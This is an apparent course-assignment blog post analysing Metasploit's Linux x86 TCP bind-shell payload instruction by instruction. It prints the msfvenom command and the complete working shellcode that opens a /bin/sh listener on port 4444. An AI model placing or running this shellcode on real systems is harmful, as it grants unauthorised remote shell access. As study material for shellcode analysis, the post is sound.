<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.1: Metasploit TCP Bind Shellcode Analysis</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120451103-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-120451103-1');
</script>


</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="About.html">About</a></p>

<p><a href="Walkthroughs.html">Walkthroughs</a></p>

<ol>
<li><a href="Walkthroughs--HackTheBox_Jeeves_Walkthrough_and_Lessons.html">HackTheBox: Jeeves Walkthrough and Lessons</a></li>
<li><a href="Walkthroughs--HackTheBox_Bashed_Walkthrough_and_Lessons.html">HackTheBox: Bashed Walkthrough and Lessons</a></li>
<li><a href="Walkthroughs--HackTheBox_Chatterbox_Walkthrough_and_Lessons.html">HackTheBox: Chatterbox Walkthrough and Lessons</a></li>
</ol>
<p><a href="Courses.html">Courses</a></p>

<ol>
<li><a href="Courses--SLAE.html">SLAE</a></li>
<ol>
<li><a href="Courses--SLAE--1_TCP_Bind_Shellcode.html">1: TCP Bind Shellcode</a></li>
<li><a href="Courses--SLAE--2_TCP_Reverse_Shell.html">2: TCP Reverse Shell</a></li>
<li><a href="Courses--SLAE--3_Egghunter_Shellcode.html">3: Egghunter Shellcode</a></li>
<li><a href="Courses--SLAE--4_Shellcode_Encoding_Scheme.html">4: Shellcode Encoding Scheme</a></li>
<li><a href="Courses--SLAE--5.1_Metasploit_TCP_Bind_Shellcode_Analysis.html">5.1: Metasploit TCP Bind Shellcode Analysis</a></li>
<li><a href="Courses--SLAE--5.2_Metasploit_chmod_Shellcode_Analysis.html">5.2: Metasploit chmod Shellcode Analysis</a></li>
<li><a href="Courses--SLAE--5.3_Metasploit_exec_Shellcode_Analysis.html">5.3: Metasploit exec Shellcode Analysis</a></li>
<li><a href="Courses--SLAE--6_Polymorphic_Shellcode.html">6: Polymorphic Shellcode</a></li>
<li><a href="Courses--SLAE--7_Shellcode_Crypter.html">7: Shellcode Crypter</a></li>
</ol></ol></div>
<div class="page"><h1><b><u>5.1: Metasploit TCP Bind Shellcode Analysis</u></b></h1>This is an analysis of Metasploit's <strong>linux/x86/shell_bind_tcp </strong>shellcode, generated using the following command:<br /><br /><code>msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c</code><br /><br /><img src="images\10-1.png" alt="images\10-1.png" /><br /><br />As seen in the image, msfvenom generated this shellcode:<br /><br />"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"<br /><br />One can use the <strong>ndisasm</strong> utility to convert the shellcode to i86 assembly using the syntax shown in the image below (output truncated):<br /><br /><img src="images\10-2.png" alt="images\10-2.png" /><br /><br />Below I will walk through each block of the formatted i86 assembly code and explain its functionality.<br /><br /><h2>Socket Setup</h2><br /><br />The first block of code calls the Unix <strong>socket </strong>system call, which has the following signature:<br /><br /><img src="images\10-3.png" alt="images\10-3.png" /><br /><br />This block of Metasploit's generated assembly reads like this:<br /><br /><code>00000000  31DB              xor ebx,ebx<br />00000002  F7E3              mul ebx<br />00000004  53                push ebx<br />00000005  43                inc ebx<br />00000006  53                push ebx<br />00000007  6A02              push byte +0x2<br />00000009  89E1              mov ecx,esp<br />0000000B  B066              mov al,0x66<br />0000000D  CD80              int 0x80</code><br /><br />• The EBX register is zeroed via XOR against itself<br />• EAX is also zeroed by multiplying it against the newly-zeroed EBX<br />• Parameters for the socket() call are then pushed on the stack in reverse order<br />   ◇ 0 for the protocol, which indicates that the default protocol for the provided socket type will should be used.<br />   ◇ 1 for the socket type, indicating a stream socket<br />   ◇ 2 for the domain, indicating AF_INET or ipv4.<br /><br />Finally, the code fulfills the requirements for a socket-related system call.<br /><br />• EAX is loaded with the syscall number 102 for the SOCKETCALL syscall. <br />• EBX has already been loaded with the value 1, indicating that the desired socket call is socket().<br />• ECX contains the address of the parameters that have been loaded on the stack.<br /><br />The system call is then invoked using an interrupt, with the return value implicitly saved in EAX.<br /><br />The next block of code calls the Unix <strong>bind</strong> system call, which has the following signature:<br /><br /><img src="images\10-4.png" alt="images\10-4.png" /><br /><br />This block of code reads as follows:<br /><br /><code>0000000F  5B                pop ebx<br />00000010  5E                pop esi<br />00000011  52                push edx<br />00000012  680200115C        push dword 0x5c110002<br />00000017  6A10              push byte +0x10<br />00000019  51                push ecx<br />0000001A  50                push eax<br />0000001B  89E1              mov ecx,esp<br />0000001D  6A66              push byte +0x66<br />0000001F  58                pop eax<br />00000020  CD80              int 0x80</code><br /><br />• EBX is loaded with the correct socket call number (2 for bind)<br />• An arbitrary value is popped off the stack to readjust the stack pointer<br />• The values needed to populate the sockaddr structure described in the function signature are pushed onto the stack<br />   ◇ 0 or INADDR_ANY for the sockaddr family<br />   ◇ 0x5c110002 is actually two values. 5c11 (115c with proper byte significance) is the port 4444. 0002 is the domain type (AF_INET).<br />• The parameters for the socketcall are pushed onto the stack in reverse order<br />   ◇ The size of the sockaddr struct in bytes (16)<br />   ◇ The address of the sockaddr struct, in ECX. Note that although ECX was not explicitly modified to contain the address of the sockaddr struct, the pointer in ECX is still correct because of the four pop and push instructions at the beginning of this code block.<br />   ◇ The socket descriptor itself, which is still in EAX after return from the last syscall.<br />• ECX is loaded with the address of the parameters on the stack.<br />• EAX is loaded with the syscall number 102 for SOCKETCALL.<br />• The system call is invoked using an interrupt.<br /><br />The next block of code calls the Unix <strong>listen</strong> system call, which has the following signature:<br /><br /><img src="images\10-5.png" alt="images\10-5.png" /><br /><br />And the Metasploit assembly code:<br /><br /><code>00000022  894104            mov [ecx+0x4],eax<br />00000025  B304              mov bl,0x4<br />00000027  B066              mov al,0x66<br />00000029  CD80              int 0x80</code><br /><br />• The socket parameter is already on the stack at the address stored in ECX<br />• The backlog parameter (0) is moved to the correct location on the stack<br />• EAX is loaded with syscall number 102 for SOCKETCALL<br />• EBX is loaded with socketcall number 4 to indicate the listen function is being called<br />• The system call is invoked using an interrupt.<br /><br />The next block of code calls the Unix <strong>accept()</strong> system call, which has the following signature:<br /><br /><img src="images\10-6.png" alt="images\10-6.png" /><br /><br />Assembly:<br /><br /><code>0000002B  43                inc ebx<br />0000002C  B066              mov al,0x66<br />0000002E  CD80              int 0x80</code><br /><br />• EBX is incremented to 5, the proper socketcall number for accept()<br />• EAX is loaded with syscall number 102 for SOCKETCALL<br />• The socket descriptor and other parameters are already on the stack<br />• The system call is invoked using an interrupt.<br /><br />Note that if you are performing dynamic analysis on this shellcode, <strong>accept</strong> will block until a client connects to the server socket or you induce the program to continue execution through other means. Netcat would be an easy way to solve this.<br /><br /><h2>File Descriptor Manipulation</h2><br /><br />The next block of code contains a loop responsible for calling the dup2 system call several times to duplicate file handles. The purpose of this is essentially to make the socket the standard input, standard output, and standard error handle for the current process. This manipulation is what allows a client connected to the socket to send commands to the shell and view the result of commands from the shell. <br /><br />dup2 is a standard system call, not a socketcall, so no pointer to arguments is needed; all arguments are stored in general-purpose registers. The function signature is as follows:<br /><br /><img src="images\10-7.png" alt="images\10-7.png" /><br /><br /><code>00000030  93                xchg eax,ebx<br />00000031  59                pop ecx<br />00000032  6A3F              push byte +0x3f<br />00000034  58                pop eax<br />00000035  CD80              int 0x80<br />00000037  49                dec ecx<br />00000038  79F8              jns 0x32</code><br /><br />• EBX is loaded with the socket returned from accept().<br />• ECX is loaded with a value from the top of the stack. This value represents the file descriptor that will be created, and it will be repeatedly decremented to assure that the process's standard error (2) standard output (1) and standard input (0) go to the socket.<br />• EAX is loaded with the correct system call number 63 for the dup2() function.<br />• The system call is invoked using an interrupt.<br />• ECX is decremented.<br />• The jns (short jump if no sign flag) instruction is used to return to the top of the loop (address 0032 in the above output) if ECX is still a non-negative number.<br /><br /><h2>Shell Execution</h2><br /><br />The final block of code calls the <strong>execve() </strong>system call and replaces the executable image of the current process with "/bin/sh." Since the socket is now the process's standard input, output, and error stream, the socket will be the source of all input to this newly spawned shell and the destination of all output from the shell.<br /><br />execve has the following function signature:<br /><br /><img src="images\10-8.png" alt="images\10-8.png" /><br /><br />And Metasploit's generated code:<br /><br /><code>0000003A  682F2F7368        push dword 0x68732f2f<br />0000003F  682F62696E        push dword 0x6e69622f<br />00000044  89E3              mov ebx,esp<br />00000046  50                push eax<br />00000047  53                push ebx<br />00000048  89E1              mov ecx,esp<br />0000004A  B00B              mov al,0xb<br />0000004C  CD80              int 0x80</code><br /><br />• The string "/bin//sh" is pushed onto the stack from end to beginning in the form of two DWORDs full of ASCII hex values.<br />• EBX is loaded with a pointer to the "/bin/sh" string, satisfying the "filename" parameter.<br />• The pointer to the "/bin/sh" string, contained in EBX, is pushed onto the stack. The stack pointer is then stored in ECX. This is to satisfy the "argv" parameter above, as it is a Linux convention that when executing a command-line program its first argument is the path to the program's own binary.<br />• EDX already contains 0; if no "envp" parameter is required, a null pointer can be passed.<br />• EAX is loaded with the correct system call number, 11 for <strong>execve</strong>.<br />• The system call is invoked using an interrupt.<br /><br />That's all--complete TCP bind shellcode.<br /><br />---<br /><br /><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:<br /></em><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><em><br />Student ID: SLAE - 1353</em></div></div>
</body></html>